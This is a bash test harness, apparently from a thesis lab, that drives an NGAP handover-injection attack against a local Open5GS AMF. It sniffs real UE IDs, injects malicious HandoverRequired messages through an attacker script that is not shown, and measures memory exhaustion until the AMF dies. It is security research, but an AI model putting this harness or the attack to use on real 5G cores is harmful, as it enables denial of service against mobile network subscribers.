#!/usr/bin/env bash
set -uo pipefail
SD="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
REPO="$(cd "$SD/../.." && pwd)"
CAP="$REPO/captures"
RIG="$REPO/config/oai_ho_w33/run_ho_rig.sh"
ATTACKER="$SD/attacker.py"
ORBITAL="$SD/orbital_timing.py"
UE_DIR="$REPO/config/oai_ho_w33/ue_gen"
NS=nicolaka/netshoot

N="${N:-25}"
MODE="${MODE:-cycle}"
ALT="${ALT:-600}"; ELEV="${ELEV:-10}"; N_MODEL="${N_MODEL:-1000}"
DWELL=$(python3 "$ORBITAL" --alt "$ALT" --elev "$ELEV" --field dwell)
RATE=$(python3 -c "print(f'{$N_MODEL/$DWELL:.2f}')")
INTERVAL=$(python3 -c "print(f'{$DWELL/$N_MODEL:.2f}')")
HO_GAP="${HO_GAP:-0.5}"

TS=$(date +%Y%m%d_%H%M%S)
PCAP="$CAP/thesis_saturation_${TS}.pcap"
CSV="$CAP/thesis_saturation_${TS}.csv"
IDLOG="$CAP/thesis_saturation_ids_${TS}.txt"

amf_pid(){ pgrep -x open5gs-amfd | head -1; }
rss_kb(){ local p; p=$(amf_pid); [ -n "$p" ] && awk '/VmRSS/{print $2}' "/proc/$p/status" || echo ""; }

probe_legit(){
  python3 - "$SD" <<'PY'
import sys,time,socket,importlib.util
sd=sys.argv[1]
spec=importlib.util.spec_from_file_location("craft",sd+"/03_ngap_handover_craft.py")
m=importlib.util.module_from_spec(spec); spec.loader.exec_module(m)
t0=time.time()
try:
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM,socket.IPPROTO_SCTP); s.settimeout(3)
    s.connect((m.AMF_ADDR,m.AMF_PORT)); s.send(m.encode(m.build_ng_setup_request(7000,"gNB-legit-probe")))
    ok=m.decode(s.recv(4096))[0]=="successfulOutcome"; s.close()
    print(f"{int(ok)} {(time.time()-t0)*1000:.0f}")
except Exception:
    print(f"0 {(time.time()-t0)*1000:.0f}")
PY
}

cleanup(){ docker stop cap_thesis >/dev/null 2>&1 || true; "$RIG" down >/dev/null 2>&1 || true; }
trap cleanup EXIT

ss -lnA sctp 2>/dev/null | grep -q ':38412' || { echo "[!] AMF N2 non in ascolto: avvia il core."; exit 1; }
docker ps >/dev/null 2>&1 || { echo "[!] docker non accessibile."; exit 1; }
amf_pid >/dev/null || { echo "[!] open5gs-amfd non attivo."; exit 1; }
[ -f "$UE_DIR/ue_${N}.conf" ] || { echo "[!] manca $UE_DIR/ue_${N}.conf (config UE)."; exit 1; }

docker run -d --rm --name cap_thesis --network host --cap-add NET_RAW -v "$CAP:/cap" "$NS" \
  tcpdump -i lo -U -w "/cap/$(basename "$PCAP")" "sctp port 38412" >/dev/null
until docker ps --format '{{.Names}}'|grep -q cap_thesis; do sleep 1; done; sleep 1

if [ "$MODE" = cycle ]; then "$RIG" gnbs || { echo "[!] gnbs falliti"; exit 1; }; fi

echo "inj,epoch,imsi,amf_ue_id,accepted,amfd_rss_kb,legit_ok,legit_ms" > "$CSV"
echo "iter,imsi,amf_ue_ngap_id_sniffato" > "$IDLOG"
base=$(rss_kb); echo "0,$(date +%s),-,-,-,${base},1,0" >> "$CSV"
echo "[i] baseline RSS AMF = ${base} kB"
printf "%-4s %-18s %-14s %-4s %-9s %-6s\n" iter IMSI ID-sniffato acc rss_kb legit

died=0
for k in $(seq 1 "$N"); do
  imsi=$(printf "9017000000000%02d" "$k")
  ue_conf="$UE_DIR/ue_${k}.conf"
  HO_DIR="ho01"   # l'UE (portante gNB0) si aggancia sempre a gNB0 -> HO gNB0->gNB1 (default per ogni MODE)

  if [ "$MODE" = full ]; then
    UE_CONF="$(realpath "$ue_conf")" "$RIG" up >/dev/null 2>&1 || {
      echo "  [iter $k] rig up fallito"
      continue
    }
  else
    # ciclo di vita completo dell'UE per iterazione (~15s): rebuild gNB0+UE+gNB1,
    # cosi' i gNB (client rfsim) si riagganciano al nuovo UE-server. Fedele al testo.
    UE_CONF="$(realpath "$ue_conf")" "$RIG" up >/dev/null 2>&1 || {
      echo "  [iter $k] UE $imsi non registrato"
      "$RIG" down >/dev/null 2>&1
      continue
    }

    # UE fisso sulla portante di gNB0 -> si aggancia sempre a gNB0 -> HO gNB0->gNB1
    HO_DIR="ho01"
    echo "  [iter $k] UE $imsi su gNB0 -> HO gNB0->gNB1"
  fi

# --- INIZIO LOGICA REATTIVA ---
  out_file=$(mktemp)
  
  # 1. Avvia l'attaccante in background, passandogli il file PCAP da cui sniffare
  python3 "$ATTACKER" mimicry_reattivo --count 1 --pcap "$PCAP" > "$out_file" 2>&1 &
  ATTACKER_PID=$!

  # 2. Margine perche' l'attaccante parta, registri i finti gNB e fissi t0 PRIMA del
  #    trigger (con netem su N2 le registrazioni sono piu' lente: serve piu' di 1s)
  sleep 6

  # 3. Scatena l'handover legittimo (che farà da Trigger per l'attaccante)
  "$RIG" "$HO_DIR" >/dev/null 2>&1

  # 4. Attendi che l'attaccante intercetti, inietti la sua richiesta malevola e termini
  wait $ATTACKER_PID
  out=$(cat "$out_file")
  rm -f "$out_file"

  # Recupera l'ID direttamente dai log dell'attaccante
  nid=$(echo "$out" | grep -oP 'AMF-UE-NGAP-ID=\K[0-9]+' | tail -1)
  [ -z "$nid" ] && nid="-"
  
  if [ "$nid" = "-" ]; then
    # l'attaccante non inietta anche quando l'amfd viene OOM-killed proprio in questa
    # iterazione (la connessione N2 cade): cattura la NEGAZIONE del servizio (DEAD) invece
    # di saltare a vuoto e proseguire con "UE non registrato".
    if [ -z "$(amf_pid)" ]; then
      died=$k; echo "$k,$(date +%s),$imsi,-,-,DEAD,0," >> "$CSV"
      printf "%-4s %-18s %-14s %-4s %-9s\n" "$k" "$imsi" "-" "-" "DEAD <- OOM"; break
    fi
    echo "  [iter $k] nessun Handover intercettato in tempo, salto"
    [ "$MODE" = cycle ] && "$RIG" ue_down >/dev/null 2>&1
    continue
  fi
  
  echo "$k,$imsi,$nid" >> "$IDLOG"
  echo "$out" | grep -q ACCETTATO && acc=1 || acc=0
  # --- FINE LOGICA REATTIVA ---

  pid=$(amf_pid)
  if [ -z "$pid" ]; then
    died=$k; echo "$k,$(date +%s),$imsi,$nid,$acc,DEAD,0," >> "$CSV"
    printf "%-4s %-18s %-14s %-4s %-9s\n" "$k" "$imsi" "$nid" "$acc" "DEAD <- OOM"; break
  fi
  read lok lms < <(probe_legit)
  rss=$(rss_kb)
  echo "$k,$(date +%s),$imsi,$nid,$acc,${rss},${lok},${lms}" >> "$CSV"
  printf "%-4s %-18s %-14s %-4s %-9s %-6s\n" "$k" "$imsi" "$nid" "$acc" "${rss}" "$([ "$lok" = 1 ] && echo OK || echo FAIL)"

  [ "$MODE" = cycle ] && "$RIG" ue_down >/dev/null 2>&1

  [ "$lok" = 0 ] && { died=$k; echo "  (servizio legittimo NEGATO a iter $k)"; break; }
  sleep "$HO_GAP"
done

echo "[+] Fermo la cattura..."; docker stop cap_thesis >/dev/null 2>&1 || true; sleep 1

echo "Analisi pcap:"
docker run --rm --network host -v "$CAP:/cap" "$NS" bash -c "
  f=/cap/$(basename "$PCAP")
  echo -n '  HandoverRequired MALEVOLI (->0xc00) : '; tshark -r \$f -Y 'ngap.procedureCode==12 && ngap.NGAP_PDU==0' -T fields -e ngap.gNB_ID 2>/dev/null | grep -c c000
  echo -n '  HandoverRequired LEGITTIMI (->0xb00) : '; tshark -r \$f -Y 'ngap.procedureCode==12 && ngap.NGAP_PDU==0' -T fields -e ngap.gNB_ID 2>/dev/null | grep -c b000
  echo -n '  HandoverNotify legittimi   : '; tshark -r \$f -Y 'ngap.procedureCode==11' 2>/dev/null | wc -l
  echo -n '  Malformed NGAP                        : '; tshark -r \$f -Y 'ngap && _ws.malformed' 2>/dev/null | wc -l
  echo -n '  Pacchetti ESP/IPsec: '; tshark -r \$f -Y 'esp' 2>/dev/null | wc -l
  echo -n '  ID malevoli usati: '; tshark -r \$f -Y 'ngap.procedureCode==12 && ngap.NGAP_PDU==0' -T fields -e ngap.AMF_UE_NGAP_ID -e ngap.gNB_ID 2>/dev/null | grep c000 | awk '{print \$1}' | sort -un | tr '\n' ' '; echo
" 2>/dev/null

python3 - "$IDLOG" "$CSV" <<'PY'
import csv,sys
ids=set()
with open(sys.argv[1]) as f:
    next(f,None)
    for line in f:
        p=line.strip().split(',')
        if len(p)>=3 and p[2].isdigit(): ids.add(p[2])
print("  ID reali sniffati e iniettati:", len(ids), sorted(ids, key=int))
PY

echo "  Stato del servizio (saturazione):"
python3 - "$CSV" <<'PY'
import csv, sys
rows = list(csv.reader(open(sys.argv[1])))[1:]
def col(r, i, d=None): return r[i] if len(r) > i else d
acc0   = [int(r[0]) for r in rows if col(r,4) == '0']
acc1   = [int(r[0]) for r in rows if col(r,4) == '1']
legit0 = [int(r[0]) for r in rows if col(r,6) == '0']
dead   = [int(r[0]) for r in rows if col(r,5) == 'DEAD']
rss    = [int(r[5]) for r in rows if str(col(r,5,'')).isdigit()]
peak   = max(rss)//1024 if rss else 0
if dead:
    print(f"   SERVIZIO NEGATO (OOM): open5gs-amfd terminato all'iniezione {dead[0]}.")
elif acc0:
    ok = max(acc1) if acc1 else 0
    print(f"   AMF SATURATO -> NEGAZIONE DEL SERVIZIO: handover accettati (acc=1) fino alla {ok}a")
    print(f"   iniezione; dalla {acc0[0]}a in poi RIFIUTATI con ErrorIndication (acc=0), l'AMF non")
    print(f"   completa piu' handover ne' registra nuovi UE. RSS max ~{peak} MB / tetto 1024 MB.")
elif legit0:
    print(f"   SERVIZIO NEGATO: probe legittimo fallito all'iniezione {legit0[0]}.")
else:
    print(f"   Servizio non saturato (RSS max ~{peak} MB). Alza N o abbassa il tetto.")
PY
